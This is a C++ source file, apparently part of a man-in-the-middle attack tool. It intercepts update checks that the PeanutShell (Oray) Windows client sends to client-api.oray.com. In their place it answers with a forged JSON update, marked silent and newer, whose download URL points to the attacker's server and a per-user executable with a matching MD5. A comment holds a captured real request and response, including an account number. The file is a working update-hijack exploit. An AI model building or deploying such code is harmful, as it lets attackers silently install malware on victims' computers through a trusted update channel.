
#include "peanutShell.h"
#include "../attacker.h"
#include "../HttpPartial.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../version.h"
#include "PluginServer.h"

int PeanutShell::isPeanutShell(string url, string host) {
	if (strstr(host.c_str(), "client-api.oray.com") && strstr(url.c_str(), "/softwares/PEANUTHULL_WINDOWS_V/publish?") )
	{
		return TRUE;
	}
	return FALSE;
}


int PeanutShell::replyPeanutShell(char * dstbuf, int dstbuflimit, LPHTTPPROXYPARAM lpssl) {
	int ret = 0;
	char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Length: %u\r\nContent-Type: application/json\r\nConnection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"{\"publishid\":42,\"softwareid\":63,\"versionno\":\"9.1.1.30645\",\"isforce\":false,\"issilent\":true,\"ispublish\":true,"
		"\"targetversions\":\"9.0.0.17276\","
		"\"publishtime\":\"2050-08-20 11:30:00\",\"expiredtime\":\"2050-09-30 00:00:00\",\"version\":{\"versionid\":1101,"
		"\"softwareid\":63,\"versionname\":\"9.1.1 for Windows\",\"versionno\":\"9.1.1.30645\","
		"\"md5\":\"%s\",\"size\":\"1MB\",\"system\":\"WinXP Win2003 WinVista Win2008 Win2012 Win7 Win8 Win10\","
		"\"lang\":\"zh_CN\",\"downloadurl\":\"https:\\/\\/%s\\/%s\",\"downloadurlmultiple\":null,\"memo\":\"\","
		"\"versiontype\":\"stable\",\"devicemodel\":\"\",\"downloads\":128466,\"createtime\":\"2050-06-30 23:58:02\",\"updatedate\":\"2050-06-30 00:00:00\","
		"\"logs\":[{\"logid\":1172,\"softwareid\":63,\"versionid\":\"1101\",\"lang\":\"zh_CN\","
		"\"logs\":\"<ol><li><\/li><li><\/li><li><\/li><li><\/li><li>Bug<\/li><\/ol>\",\"updatedate\":\"2020-06-30 00:00:00\","
		"\"createtime\":\"2020-06-30 23:59:17\"}],\"software\":null,\"isvalid\":true,\"language\":\"\",\"isx64\":false}}";

	string fn = WEIXIN_PC_UPDATE_EXE_FILENAME;
	string filename = Public::getUserPluginPath(lpssl->username) + fn;
	string szip = HttpUtils::getIPstr(gServerIP) + "\\/" + lpssl->username;
	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);
	if (filesize <= 0)
	{
		return FALSE;
	}

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,szmd5,szip.c_str(), fn.c_str());

	int resultlen = sprintf_s(dstbuf, dstbuflimit, lpRespFormat, iRespContentLen, lpRespContent);
	return resultlen;
}


/*
GET /softwares/PEANUTHULL_WINDOWS_V/publish?version=&lang=&account=18265858190&type=& HTTP/1.1
Accept-HskModules: udp;ssl
Accept-Language: zh-CN,en;q=0.8
Content-Type: application/x-www-form-urlencoded
Accept: *//*
Host: client-api.oray.com
User-Agent: hskddns/5.1 (Windows)

HTTP/1.1 200 OK
Server: nginx
Date: Sat, 19 Sep 2020 08:22:05 GMT
Content-Type: application/json
Content-Length: 1538
Connection: keep-alive
Vary: Accept-Encoding
Access-Control-Allow-Headers: content-type,authorization,user-agent,content-length,cookie,cache-control
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true

{"publishid":42,"softwareid":63,"versionno":"5.1.1.30645","isforce":false,"issilent":false,"ispublish":true,
"targetversions":"5.0.0.17276\u30015.0.0.20063\u30015.0.0.21724\u30015.1.0.25265","publishtime":"2020-08-20 11:30:00",
"expiredtime":"2020-09-30 00:00:00","version":{"versionid":1101,"softwareid":63,
"versionname":"\u82b1\u751f\u58f3\u5185\u7f51\u7a7f\u900f5.1.1 for Windows","versionno":"5.1.1.30645",
"md5":"4F82C30812B7058F44825A7F7312599F","size":"2.95MB","system":"WinXP Win2003 WinVista Win2008 Win2012 Win7 Win8 Win10",
"lang":"zh_CN","downloadurl":"https:\/\/dl-cdn.oray.com\/hsk\/windows\/HskDDNS_5.1.1.30645.exe",
"downloadurlmultiple":null,"memo":"\u65b0\u589e\u573a\u666f\u6620\u5c04\r\n\u6dfb\u52a0\/\u7f16\u8f91\u6620\u5c04\u652f\u6301\u65b0\u589e\u5e26\u5bbd\u52a0\u901f\r\n\u4f18\u5316\u65e5\u5fd7\u4fdd\u5b58\u89c4\u5219",
"versiontype":"stable","devicemodel":"","downloads":128466,"createtime":"2020-06-30 23:58:02","updatedate":"2020-06-30 00:00:00",
"logs":[{"logid":1172,"softwareid":63,"versionid":"1101","lang":"zh_CN",
"logs":"<ol><li>\u65b0\u589e\u573a\u666f\u6620\u5c04<\/li><li>\u6dfb\u52a0\/\u7f16\u8f91\u6620\u5c04\u652f\u6301\u65b0\u589e\u5e26\u5bbd\u52a0\u901f<\/li><li>\u4f18\u5316\u65e5\u5fd7\u4fdd\u5b58\u89c4\u5219<\/li>
<li>\u4fee\u6539\u5bc6\u7801\u540e\u81ea\u52a8\u9000\u51fa\u5ba2\u6237\u7aef<\/li><li>\u4fee\u590d\u5df2\u77e5Bug<\/li><\/ol>",
"updatedate":"2020-06-30 00:00:00","createtime":"2020-06-30 23:59:17"}],"software":null,"isvalid":true,"language":"\u7b80\u4f53\u4e2d\u6587","isx64":false}}
*/